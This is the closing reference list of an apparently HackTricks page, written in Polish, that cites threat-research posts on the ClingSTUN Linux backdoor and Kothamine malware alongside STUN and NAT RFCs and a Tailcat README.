- [59] [FortiGuard Labs — backdoor ClingSTUN w systemie Linux nadużywa publicznej infrastruktury STUN](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
- [60] [RFC 8489 — narzędzia do przechodzenia przez NAT dla sesji (STUN)](https://www.rfc-editor.org/rfc/rfc8489.html)
- [61] [RFC 4787 — wymagania dotyczące zachowania NAT dla unicast UDP](https://www.rfc-editor.org/rfc/rfc4787.html)
- [62] [Plik README Tailcat](https://github.com/tailscale/tailcat/blob/main/README.md)
- [63] [Malwarebytes — malware Kothamine wykorzystuje tailcat od Tailscale, aby unikać wykrycia w sieci](https://www.malwarebytes.com/blog/threat-intel/2026/09/kothamine-malware-uses-tailscales-tailcat-to-evade-network-detection)
{{#include ../banners/hacktricks-training.md}}
